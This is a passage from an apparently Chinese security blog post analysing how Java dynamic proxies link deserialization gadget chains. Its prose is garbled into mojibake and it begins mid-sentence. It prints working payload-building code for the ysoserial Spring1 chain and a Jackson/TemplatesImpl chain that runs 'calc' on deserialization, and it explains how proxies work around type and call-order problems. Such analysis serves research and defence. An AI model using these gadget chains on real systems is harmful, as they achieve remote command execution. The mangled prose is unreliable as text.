¸å¿ƒåœ¨äº<code>InvocationHandler</code>ï¼Œç”¨æˆ·é€šè¿‡è‡ªå®šä¹‰<code>InvocationHandler</code>å¯ä»¥å®ç°ç»Ÿä¸€çš„æ—¥å¿—ç®¡ç†ï¼ŒçŠ¶æ€æ£€æŸ¥ä»¥åŠå…¶ä»–æ›´é«˜çº§çš„åŠŸèƒ½ï¼Œå¦‚åœ¨æœ¬æ–‡ä¸­å°†ä¼šæåŠçš„ä¿®æ”¹æ–¹æ³•è¿”å›å¯¹è±¡ã€å±è”½æ–¹æ³•è°ƒç”¨å¼‚å¸¸ã€è¿›è¡Œæ–¹æ³•è°ƒç”¨åˆ†æµç­‰ã€‚  </p>
<span id="more"></span>
<h2 id="åŠ¨æ€ä»£ç†çš„åº”ç”¨"><a href="#åŠ¨æ€ä»£ç†çš„åº”ç”¨" class="headerlink" title="åŠ¨æ€ä»£ç†çš„åº”ç”¨"></a>åŠ¨æ€ä»£ç†çš„åº”ç”¨</h2><p>åœ¨<code>JAVA</code>åŸç”Ÿååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨è¿‡ç¨‹ä¸­ï¼Œæœ€å›°éš¾çš„ä¸åœ¨äºå¯»æ‰¾å¯æ§è¾“å…¥çš„<code>readObject</code>æ–¹æ³•è°ƒç”¨ï¼Œè€Œåœ¨äºå¯»æ‰¾ä¸€æ¡å¯ç”¨çš„ååºåˆ—åŒ–è°ƒç”¨é“¾ã€‚<br>åœ¨å¯»æ‰¾ååºåˆ—åŒ–åˆ©ç”¨é“¾çš„è¿‡ç¨‹ä¸­ï¼Œå¯èƒ½ä¼šé‡åˆ°å¦‚ä¸‹å‡ ä¸ªé—®é¢˜ï¼š</p>
<ul>
<li>æ‰¾åˆ°äº†å¯ä»¥è¿›è¡Œåå°„æ–¹æ³•è°ƒç”¨çš„åœ°æ–¹ä½†æ˜¯åªèƒ½è°ƒç”¨ç‰¹å®šç±»å‹çš„æ–¹æ³•ï¼›</li>
<li>æ‰¾åˆ°äº†èƒ½å¤Ÿè°ƒç”¨æŸä¸ªç±»çš„æ‰€æœ‰<code>getter</code>çš„æ–¹æ³•ä½†æ˜¯æ–¹æ³•è°ƒç”¨é¡ºåºæ˜¯éšæœºçš„ï¼ŒæŸäº›æ–¹æ³•çš„è°ƒç”¨ä¼šäº§ç”Ÿå¼‚å¸¸å¯¼è‡´ç¨‹åºé€€å‡ºã€‚</li>
</ul>
<p>è¿™äº›é—®é¢˜éƒ½èƒ½åˆ©ç”¨åŠ¨æ€ä»£ç†ä»£ç†ç±»çš„ç‰¹æ€§æˆ–è€…<code>InvocationHandler</code>å®ç°çš„åŠŸèƒ½è§£å†³ã€‚  </p>
<h3 id="ä¿®æ”¹æ–¹æ³•è¿”å›å¯¹è±¡"><a href="#ä¿®æ”¹æ–¹æ³•è¿”å›å¯¹è±¡" class="headerlink" title="ä¿®æ”¹æ–¹æ³•è¿”å›å¯¹è±¡"></a>ä¿®æ”¹æ–¹æ³•è¿”å›å¯¹è±¡</h3><p>ä½¿ç”¨ <code>sun.reflect.annotation.AnnotationInvocationHandler</code> å¯ä»¥ä¿®æ”¹è¢«ä»£ç†ç±»æ–¹æ³•çš„è¿”å›å€¼ï¼Œå…¶ <code>invoke</code> æ–¹æ³•å®ç°å¦‚ä¸‹ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">var4</span> <span class="operator">=</span> var2.getName();</span><br><span class="line">        Class[] var5 = var2.getParameterTypes();</span><br><span class="line">        <span class="keyword">if</span> (var4.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; var5.length == <span class="number">1</span> &amp;&amp; var5[<span class="number">0</span>] == Object.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.equalsImpl(var3[<span class="number">0</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var5.length != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">switch</span> (var4) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;toString&quot;</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">this</span>.toStringImpl();</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;hashCode&quot;</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">this</span>.hashCodeImpl();</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&quot;annotationType&quot;</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">this</span>.type;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.get(var4);</span><br><span class="line">                    <span class="keyword">if</span> (var6 == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(<span class="built_in">this</span>.type, var4);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var6 <span class="keyword">instanceof</span> ExceptionProxy) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> ((ExceptionProxy)var6).generateException();</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (var6.getClass().isArray() &amp;&amp; Array.getLength(var6) != <span class="number">0</span>) &#123;</span><br><span class="line">                            var6 = <span class="built_in">this</span>.cloneArray(var6);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">return</span> var6;</span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨ä¸Šé¢ <code>invoke</code> æ–¹æ³•çš„å®ç°ä¸­ï¼Œæœ€ç»ˆçš„è¿”å›å€¼ä¸º<code>var6</code>ï¼Œè€Œ<code>var6</code>æ¥è‡ªäº<code>memberValues</code>å¯¹è±¡<code>get</code>æ–¹æ³•çš„è°ƒç”¨ï¼Œ<code>memberValues</code>æ˜¯ä¸€ä¸ª<code>Map</code>å¯¹è±¡ï¼Œå…¶å€¼åœ¨<code>AnnotationInvocationHandler</code>å®ä¾‹åŒ–çš„è¿‡ç¨‹ä¸­è¢«èµ‹äºˆï¼Œå³è¯¥å€¼æ˜¯å¯æ§çš„ã€‚<br><code>memberValues</code>å¯¹è±¡åœ¨å–å€¼æ—¶å…¶<code>key</code>ä¸º<code>var4</code> ï¼Œä¸ºè¢«è°ƒç”¨æ–¹æ³•çš„æ–¹æ³•åï¼Œå³å…¶å€¼æ˜¯å·²çŸ¥çš„ã€‚åˆå› <code>invoke</code>æ–¹æ³•çš„è¿”å›å€¼ä¸º<code>Object</code>ç±»å‹ï¼Œæ•…<code>invoke</code>æ–¹æ³•çš„è¿”å›å€¼å¯ä»¥è¢«ä¿®æ”¹ä¸ºç”¨æˆ·æ§åˆ¶çš„ä»»æ„å¯¹è±¡ã€‚<br><code>AnnotationInvocationHandler</code>çš„è¿™ä¸€ç‰¹æ€§åœ¨ <code>Spring1</code> é“¾ä¸­æœ‰æ‰€ä½“ç°ã€‚<code>Spring1</code>é“¾æ˜¯åœ¨<code>Spring</code>æ¡†æ¶ä¸­å‘ç°çš„ä¸€æ¡ååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Œå…¶èƒ½è¾¾æˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœã€‚<br>ä¸‹é¢æ˜¯ <code>ysoserial</code> å·¥å…·åˆ›å»º<code>Spring1</code>é“¾çš„ä»£ç ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">		<span class="comment">// [0]</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line">		<span class="comment">// [1]</span></span><br><span class="line">        <span class="type">ObjectFactory</span> <span class="variable">objectFactoryProxy</span> <span class="operator">=</span> (ObjectFactory)Gadgets.createMemoitizedProxy(Gadgets.createMap(<span class="string">&quot;getObject&quot;</span>, templates), ObjectFactory.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br><span class="line">		<span class="comment">// [2]</span></span><br><span class="line">        <span class="type">Type</span> <span class="variable">typeTemplatesProxy</span> <span class="operator">=</span> (Type)Gadgets.createProxy((InvocationHandler)Reflections.getFirstCtor(<span class="string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>).newInstance(objectFactoryProxy), Type.class, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;);</span><br><span class="line">		<span class="comment">// [3]</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">typeProviderProxy</span> <span class="operator">=</span> Gadgets.createMemoitizedProxy(Gadgets.createMap(<span class="string">&quot;getType&quot;</span>, typeTemplatesProxy), Class.forName(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>), <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br><span class="line">		<span class="comment">// [4]</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">mitpCtor</span> <span class="operator">=</span> Reflections.getFirstCtor(<span class="string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);</span><br><span class="line">		<span class="comment">// [5]</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">mitp</span> <span class="operator">=</span> mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod(<span class="string">&quot;getClass&quot;</span>), <span class="number">0</span>);</span><br><span class="line">		<span class="comment">// [6]</span></span><br><span class="line">        Reflections.setFieldValue(mitp, <span class="string">&quot;methodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">		<span class="comment">// [7]</span></span><br><span class="line">        <span class="keyword">return</span> mitp;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼Œå¦‚æœå°†[1]åˆ°[7]çœ‹ä½œåºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œé‚£ä¹ˆä»[7]åˆ°[1]å°±æ˜¯ååºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚<br>åŠ¨æ€ä»£ç†å‘æŒ¥ä½œç”¨çš„è¿‡ç¨‹ä½¿ç”¨ä¸‹é¢çš„å›¾ç‰‡è¿›è¡Œè¯´æ˜ã€‚<br><img src="/archives/42eb2c82/006.png">  </p>
<p>åœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­é¦–å…ˆè¢«è°ƒç”¨çš„æ˜¯<code>SerializableTypeWrapper$MethodInvokeTypeProvider</code>çš„ <code>readObject</code> æ–¹æ³•  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream inputStream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">            inputStream.defaultReadObject();</span><br><span class="line">			<span class="comment">// [8]</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ReflectionUtils.findMethod(<span class="built_in">this</span>.provider.getType().getClass(), <span class="built_in">this</span>.methodName);</span><br><span class="line">			<span class="comment">// [9]</span></span><br><span class="line">            <span class="built_in">this</span>.result = ReflectionUtils.invokeMethod(method, <span class="built_in">this</span>.provider.getType());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨æ ‡è®°[9]çš„åœ°æ–¹<code>invokeMethod</code>æ–¹æ³•è¢«è°ƒç”¨ï¼Œé€šè¿‡åå°„è¿›è¡Œæ— å‚æ–¹æ³•è°ƒç”¨ï¼Œå‚æ•°<code>method</code>ä¸º<code>Method</code>å¯¹è±¡ï¼Œ<code>this.provider.getType()</code>åˆ™ç”¨äºæŒ‡å®šè°ƒç”¨æ–¹æ³•æ‰€å±å¯¹è±¡ã€‚<br>ä¼—æ‰€å‘¨çŸ¥ï¼Œ<code>TemplatesImpl</code>ç±»çš„<code>newTransformer</code>æ–¹æ³•æ˜¯ä¸€ä¸ªå¸¸ç”¨çš„ååºåˆ—åŒ–é“¾ç‰‡æ®µï¼Œåˆšå¥½è¯¥æ–¹æ³•æ˜¯ä¸€ä¸ªæ— å‚æ–¹æ³•ã€‚ æ‰€ä»¥å¦‚æœ<code>method</code>åˆšå¥½æ˜¯<code>newTransformer</code>æ–¹æ³•ï¼Œ<code>this.provider.getType()</code>åˆšå¥½è¿”å›<code>TemplatesImpl</code>å¯¹è±¡å°±æ°åˆ°å¥½å¤„äº†ã€‚<br><code>method</code>æ¥è‡ªäºæ ‡è®°[8]çš„æ–¹æ³•è°ƒç”¨ã€‚è¿™ä¹Ÿæ˜¯ä¸€ä¸ªåå°„æ–¹æ³•è°ƒç”¨ï¼Œæ‰€ä»¥åªéœ€è¦åœ¨æ„é€ <code>SerializableTypeWrapper$MethodInvokeTypeProvider</code>å¯¹è±¡æ—¶è®¾ç½®<code>methodName</code>å±æ€§ä¸º<code>newTransformer</code>å³å¯ã€‚<br>è°ƒç”¨æ–¹æ³•çš„é—®é¢˜è§£å†³äº†ï¼Œè¿˜éœ€è¦è°ƒç”¨å¯¹è±¡çš„é…åˆï¼Œè°ƒç”¨å¯¹è±¡æ¥è‡ªäº<code>this.provider.getType()</code>çš„é…åˆï¼Œ<code>this.provider</code>æ˜¯ä¸€ä¸ª<code>TypeProvider</code>ç±»å‹ï¼Œè§‚å¯Ÿå…¶<code>getType</code>æ–¹æ³•çš„ç­¾åå‘ç°è¯¥æ–¹æ³•è¿”å›å€¼ç±»å‹ä¸º<code>Type</code>ç±»å‹ï¼Œä¸æ‰€éœ€çš„<code>TemplatesImpl</code>ç±»å‹ä¸åŒ¹é…ã€‚<br>ä¸€èˆ¬æƒ…å†µä¸‹è·¯èµ°åˆ°è¿™é‡Œå°±èµ°åˆ°æ­»èƒ¡åŒäº†ï¼Œä¸è¿‡é€šè¿‡ç­¾åæåˆ°çš„<code>AnnotationInvocationHandler</code>çš„ç‰¹æ€§æˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªæ­»èƒ¡åŒæ‰“ç©¿å½¢æˆä¸€æ¡æ–°çš„è·¯ã€‚<br><code>AnnotationInvocationHandler</code>çš„<code>invoke</code>æ–¹æ³•è°ƒç”¨å¯ä»¥ä¿®æ”¹è¢«ä»£ç†æ–¹æ³•çš„è¿”å›å€¼ï¼Œæ‰€ä»¥å¯ä»¥åˆ›å»ºä¸€ä¸ªä»£ç†ç±»ä»£ç† <code>SerializableTypeWrapper$TypeProvider</code>ç±»ï¼Œå°†<code>TemplatesImpl</code>å¯¹è±¡ä»¥æ–¹æ³•å<code>getType</code>ä¸º<code>key</code>æ”¾åˆ°<code>AnnotationInvocationHandler</code>çš„<code>memberValues</code>å¯¹è±¡ä¸­ã€‚<br>è¿™ä¾¿æ˜¯æœ¬èŠ‚æ ‡è®°[3]å¤„ä»£ç çš„æ„ä¹‰ã€‚<br>åˆ°äº†è¿™é‡Œä¼¼ä¹å°±å¯ä»¥ç»“æŸäº†ï¼Œä½†æ˜¯å‰é¢å¿½ç•¥äº†ä¸€ç‚¹å°±æ˜¯<code>getType</code>æœ¬èº«æ˜¯è¿”å›<code>Type</code>ç±»å‹çš„ï¼Œè™½ç„¶æ›¿æ¢äº†è¿”å›ç»“æœä¸º<code>TemplatesImpl</code>æ»¡è¶³äº†ååºåˆ—åŒ–é“¾çš„éœ€æ±‚ï¼Œä½†æ˜¯<code>TemplatesImpl</code>æœ¬èº«å¹¶ä¸å®ç°<code>Type</code>æ¥å£ã€‚<br>é‚£ä¹ˆä¾¿å¯ä»¥ç»§ç»­ç”Ÿæˆä¸€ä¸ªä»£ç†ç±»è®©å…¶åŒæ—¶å®ç°<code>Type</code>ä»¥åŠ<code>Templates</code>æ¥å£ï¼Œè¿™ä¾¿æ˜¯æœ¬èŠ‚æ ‡è®°[2]å¤„ä»£ç çš„æ„ä¹‰ã€‚<br><code>AutowireUtils$ObjectFactoryDelegatingInvocationHandler</code>çš„<code>invoke</code>æ–¹æ³•æ˜¯è¿™æ ·çš„ã€‚å…¶ä¼šä»<code>ObjectFactory</code> å±æ€§ä¸­é€šè¿‡<code>getObjectæ–¹</code>æ³• è·å–ç›®æ ‡å¯¹è±¡ï¼Œè‹¥è¦ä½¿å¾—<code>getObject</code>æ–¹æ³•è¿”å›<code>TemplatesImpl</code> å¯¹è±¡ï¼Œ<br>åˆ™éœ€è¦å†æ¬¡ä½¿ç”¨<code>AnnotationInvocationHandler</code>ä»£ç†<code>ObjectFactory</code>ã€‚ è¿™å°±æ˜¯æœ¬èŠ‚æ ‡è®°[1]å¤„ä»£ç çš„æ„ä¹‰ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> method.getName();</span><br><span class="line">            <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;equals&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> proxy == args[<span class="number">0</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;hashCode&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> System.identityHashCode(proxy);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">&quot;toString&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.objectFactory.toString();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> method.invoke(<span class="built_in">this</span>.objectFactory.getObject(), args);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> var6.getTargetException();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡ä¸Šé¢çš„åˆ†æå¯çŸ¥ï¼Œåœ¨<code>Spring1</code> é“¾ä¸­ï¼Œå¤šæ¬¡ä½¿ç”¨äº†<code>AnnotationInvocationHandler</code>å¯ä»¥ä¿®æ”¹æ–¹æ³•è°ƒç”¨çš„æ”¾å›å€¼çš„ç‰¹æ€§åˆ©ç”¨åŠ¨æ€ä»£ç†æœºåˆ¶å®Œæˆååºåˆ—åŒ–åˆ©ç”¨é“¾ç‰‡æ®µçš„è¿æ¥ã€‚<br>å½“ç„¶ï¼Œ<code>AnnotationInvocationHandler</code>çš„ä½¿ç”¨å¹¶ä¸æ˜¯æ²¡æœ‰é™åˆ¶çš„ã€‚ é¦–å…ˆæˆ‘ä»¬ä»ä¸Šé¢<code>Spring1</code>é“¾çš„åˆ†æä¸­å¾—çŸ¥ <code>AnnotationInvocationHandler</code>çš„<code>invoke</code>æ–¹æ³•åœ¨è°ƒç”¨å®Œæˆåè¿”å›è¢«ä¿®æ”¹åçš„å¯¹è±¡ï¼Œ<br>è¯¥å¯¹è±¡è¦ä¿è¯èƒ½å¤Ÿè¢«æ¥å—çš„å˜é‡æ‰€å…¼å®¹ï¼Œå³éœ€è¦ä¿è¯æ¥æ”¶å˜é‡ä¸ºè¯¥è¿”å›å€¼çš„çˆ¶ç±»å‹ï¼Œåœ¨<code>Spring1</code>çš„ä¾‹å­ä¸­invokeMethodçš„æ–¹æ³•ç­¾åçš„ç¬¬äºŒä¸ªå‚æ•°ç”¨äºæ¥æ”¶ä¿®æ”¹åçš„å¯¹è±¡ï¼Œæ°å¥½å…¶ä¸º<code>Object</code>ç±»å‹ä¸ºæ‰€æœ‰ç±»å‹çš„çˆ¶ç±»å‹æ‰€ä»¥å¹¶æ²¡æœ‰å‘ç”Ÿå¼‚å¸¸ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">invokeMethod</span><span class="params">(Method method, Object target)</span></span><br></pre></td></tr></table></figure>
<p>è€Œåœ¨ä»£ç†<code>getType</code>æ–¹æ³•æ—¶ï¼Œå› ä¸º<code>getType</code>æ–¹æ³•æœ¬èº«æ¥æ”¶çš„å“åº”ç±»å‹ä¸º<code>Type</code>ç±»å‹ï¼Œè€Œæˆ‘ä»¬å¸Œæœ›å“åº”<code>TemplatesImpl</code>ç±»å‹ï¼Œæ‰€ä»¥éœ€è¦é¢å¤–å€ŸåŠ©<code>AutowireUtils$ObjectFactoryDelegatingInvocationHandler</code>å†åˆ›å»ºä¸€ä¸ªä»£ç†ç±»åŒæ—¶ä»£ç†<code>Type</code>ä»¥åŠ<code>Templates</code>ç±»å‹ä»¥è¾¾åˆ°ç›®çš„ã€‚<br>æ‰€ä»¥å½“<code>AnnotationInvocationHandler</code>è¢«ç”¨ä½œæ›¿æ¢å¯¹è±¡ç±»å‹çš„æ—¶å€™å¾€å¾€ä¸æ˜¯å•ç‹¬ä½¿ç”¨çš„ï¼Œå…¶å¾€å¾€éœ€è¦å…¶ä»–ä»£ç†ç±»æ¥ä»£ç†ç‰¹å®šçš„ç±»å‹ä»¥é¿å…ç±»å‹è½¬æ¢å¼‚å¸¸ã€‚  </p>
<h3 id="æ— å…³æ–¹æ³•è°ƒç”¨å±è”½"><a href="#æ— å…³æ–¹æ³•è°ƒç”¨å±è”½" class="headerlink" title="æ— å…³æ–¹æ³•è°ƒç”¨å±è”½"></a>æ— å…³æ–¹æ³•è°ƒç”¨å±è”½</h3><p><code>Jackson</code>æ˜¯<code>JAVA</code>ä¸­ä½¿ç”¨å¹¿æ³›çš„ä¸€ä¸ªå¤„ç†<code>JSON</code>å­—ç¬¦ä¸²çš„å·¥å…·åŒ…ï¼Œåœ¨<code>Jackson</code>çš„ä»£ç ä¸­å­˜åœ¨ä¸€æ¡å®Œæˆçš„<code>JAVA</code>ååºåˆ—åŒ–åˆ©ç”¨é“¾ã€‚è¯¥é“¾åœ¨å®é™…ä½¿ç”¨è¿‡ç¨‹ä¸­å¶å°”ä¼šæ‰§è¡Œé”™è¯¯å¯¼è‡´ä¸èƒ½æˆåŠŸè¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œ<br>è¿™æºäºè¯¥é“¾æ‰§è¡Œè¿‡ç¨‹ä¸­ä½¿ç”¨çš„<code>TemplatesImpl</code>å¯¹è±¡çš„<code>getOutputProperties</code>æ–¹æ³•è°ƒç”¨ä¸ç¨³å®šï¼Œå½“ <code>getStylesheetDOM</code> å…ˆäº<code>getOutputProperties</code>è¢«è°ƒç”¨æ—¶å°†å¯¼è‡´ååºåˆ—åŒ–å¤±è´¥ã€‚<br>åœ¨å®è·µä¸­æˆ‘ä»¬å‘ç°å½“è¿™å‡ºç°è¿™ç§æƒ…å†µæ—¶ï¼Œæ— è®ºä½ é‡æ–°å°è¯•å¤šå°‘æ¬¡éƒ½ä¸ä¼šå†æˆåŠŸæ‰§è¡Œï¼Œé™¤éç›®æ ‡ç³»ç»Ÿé‡å¯ã€‚<br>å¤±è´¥çš„åŸå› åœ¨äº<code>getStylesheetDOM</code>æ–¹æ³•è°ƒç”¨æ—¶<code>_sdom</code>çš„å€¼ä¸ºç©ºï¼Œåˆå› ä¸º<code>_sdom</code>æ˜¯ä¸€ä¸ªè¢«<code>transient</code>ä¿®é¥°çš„ç¬æ€å˜é‡å¹¶ä¸å‚ä¸<code>JAVA</code>åŸç”Ÿçš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ã€‚<br>ä¸ºäº†è§£å†³è¿™ä¸€é—®é¢˜ï¼Œåœ¨<code>Jackson</code>é“¾çš„å®è·µä¸­ä½¿ç”¨äº†åŠ¨æ€ä»£ç†çš„ç‰¹æ€§ï¼š<strong>ä½¿ç”¨åå°„è·å–ä¸€ä¸ªä»£ç†ç±»ä¸Šçš„æ‰€æœ‰æ–¹æ³•æ—¶ï¼Œåªèƒ½è·å–åˆ°å…¶ä»£ç†çš„æ¥å£æ–¹æ³•</strong>ã€‚<br>å…·ä½“çš„æ“ä½œæ–¹æ³•æ˜¯åˆ›å»ºç›®æ ‡ç±»çš„ä»£ç†ç±»ï¼Œä»£ç†å…¶æŸä¸€ä¸ªæ¥å£ï¼Œå¦‚æœè¯¥æ¥å£å®šä¹‰äº†æˆ‘ä»¬å¸Œæœ›è°ƒç”¨çš„æ–¹æ³•è€Œæ²¡æœ‰å®šä¹‰å…¶ä»–çš„ä¸è¢«å¸Œæœ›è°ƒç”¨çš„æ–¹æ³•ï¼Œé‚£ä¹ˆåœ¨é€šè¿‡åå°„è·å–ä»£ç†ç±»çš„æ–¹æ³•æ—¶åªèƒ½è·å–åˆ°è¢«ä»£ç†æ¥å£ä¸­å®šä¹‰çš„æ–¹æ³•ã€‚<br>ä¸‹é¢å›¾ç‰‡ç®€è¦æ€»ç»“äº†<code>Jackson</code>é“¾è°ƒç”¨è¿‡ç¨‹ä»¥åŠå¢åŠ åŠ¨æ€ä»£ç†åç¨‹åºçš„æ‰§è¡Œé€»è¾‘ã€‚<br><img src="/archives/42eb2c82/007.png"><br>ä»¥ä¸‹ä»£ç æ˜¯<code>ysoserial</code>ä¸­ç”Ÿæˆ<code>Jackson</code>é“¾<code>Payload</code>çš„ä»£ç ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">		<span class="comment">// [0]</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> ClassPool.getDefault().get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">        ctClass.removeMethod(writeReplace);</span><br><span class="line">        ctClass.toClass();</span><br><span class="line">		<span class="comment">// [1]</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">		<span class="comment">// [2]</span></span><br><span class="line">        <span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">        advisedSupport.setTarget(templates);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxy</span> <span class="operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, handler);</span><br><span class="line">		<span class="comment">// [3]</span></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">node</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(proxy);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(val, <span class="string">&quot;val&quot;</span>, node);</span><br><span class="line">		<span class="comment">// [4]</span></span><br><span class="line">        <span class="type">byte</span>[] serialize = Serializer.serialize(val);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialize);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
